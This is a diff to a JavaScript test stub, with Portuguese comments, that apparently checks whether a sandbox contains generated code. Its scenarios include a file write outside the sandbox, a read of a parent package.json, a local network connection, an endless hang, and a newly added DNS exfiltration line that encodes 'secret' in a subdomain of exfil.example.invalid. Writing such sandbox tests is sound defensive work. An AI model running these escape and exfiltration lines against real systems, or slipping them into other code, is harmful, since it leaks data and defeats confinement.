@@ -51,6 +51,8 @@ module.exports = async function stubAdapter(candidate, ctx) {
 const SCENARIOS = {
   escape: () => ({ ...CODE, arquivos: [{ caminho: 'soma.js', conteudo: `const fs = require('fs');\nfs.writeFileSync(${JSON.stringify(require('path').join(process.env.MINHAIA_TEST_DECOY || '/nonexistent', 'ESCAPOU.txt'))}, 'x');\nconsole.log(5);\n` }] }),
   secrets: () => ({ ...CODE, arquivos: [{ caminho: 'soma.js', conteudo: `console.log(require('fs').readFileSync(${JSON.stringify(require('path').resolve(__dirname, '..', '..', 'package.json'))}, 'utf8').length);\n` }] }),
+  // exfiltração por DNS: rótulo de subdomínio com dado (resolvido no C++, abaixo de net/dgram)
+  dns: () => ({ ...CODE, arquivos: [{ caminho: 'soma.js', conteudo: "require('dns').resolveTxt('c2VncmVkbw.exfil.example.invalid', () => {});\nrequire('dns').lookup('c2VncmVkbw.exfil.example.invalid', () => {});\nconsole.log(5);\n" }] }),
   network: () => ({ ...CODE, arquivos: [{ caminho: 'soma.js', conteudo: `require('net').connect(${Number(process.env.MINHAIA_TEST_TARGET_PORT || 9)}, '127.0.0.1').on('connect', () => console.log('CONECTOU'));\nconsole.log(5);\n` }] }),
   hang: () => ({ ...CODE, arquivos: [{ caminho: 'soma.js', conteudo: 'setInterval(() => {}, 1000);\nconsole.log(5);\n' }] }),
   python: () => ({ ...CODE, arquivos: [{ caminho: 'soma.py', conteudo: 'print(2 + 3)\n' }], comandoTeste: 'python3', comandoTesteArgs: ['soma.py'] }),
